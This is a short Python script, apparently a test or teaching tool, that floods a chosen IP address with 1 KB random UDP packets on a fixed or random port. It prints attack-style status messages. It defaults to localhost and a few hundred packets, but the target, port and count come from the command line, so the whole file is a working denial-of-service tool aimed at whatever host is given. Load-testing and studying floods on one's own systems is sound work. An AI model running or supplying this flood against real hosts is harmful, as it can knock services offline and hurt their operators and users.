import sys
import os
import random
import socket
import time

def launch_udp_flood(target_ip, target_port=0, packet_count=500, delay=0.005):
    """
    Sends random binary payload packets over UDP sockets to simulate a volumetric UDP flood.
    """
    print(f"[*] Starting UDP Flood against {target_ip} ({packet_count} packets)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = os.urandom(1024) # 1KB payload
    sent = 0
    try:
        for _ in range(packet_count):
            dport = target_port if target_port > 0 else random.randint(1, 65535)
            sock.sendto(bytes_payload, (target_ip, dport))
            sent += 1
            if delay > 0:
                time.sleep(delay)
        print(f"[+] UDP Flood completed. Total packets sent: {sent}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user. Sent: {sent}")
    except Exception as e:
        print(f"[-] Error during UDP flood: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 300
    launch_udp_flood(target, port, count)
